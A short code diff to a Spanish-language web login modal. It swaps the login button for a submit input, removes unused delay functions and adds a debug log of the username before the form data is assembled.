@@ -65,28 +65,18 @@ Ingresar</button>
       </div>
       <div class="modal-footer">
        <input type="password" placeholder="Contraseña" name="" id="txtPass" style="width:70%; height:35px; padding-left: 3px;"> 
-       <button type="button" class="btn" id="btnUsuario" style="border:none; background-color:#fe6a00; color:white;">Ingresar </button>
+       <input class="btn" type="submit" value="Ingresar" id="btnContinue" style="border:none; background-color:#fe6a00; color:white;">
       </div>
     </div>
   </div>
 </div>
 
 <script type="text/javascript">
-	var espera = 0;
-
-	let identificadorTiempoDeEspera;
-
-	function retardor() {
-	  identificadorTiempoDeEspera = setTimeout(retardorX, 900);
-	}
-
-	function retardorX() {
-
-	}
 
 	$(document).ready(function() {
 
-		$('#btnUsuario').click(function(){
+		$('#btnContinue').click(function(){
+      console.log('sss',$("#txtUser").val())
 			if ($("#txtUser").val().length > 0) {
 				const data = {
                     'usuario': $("#txtUser").val(),
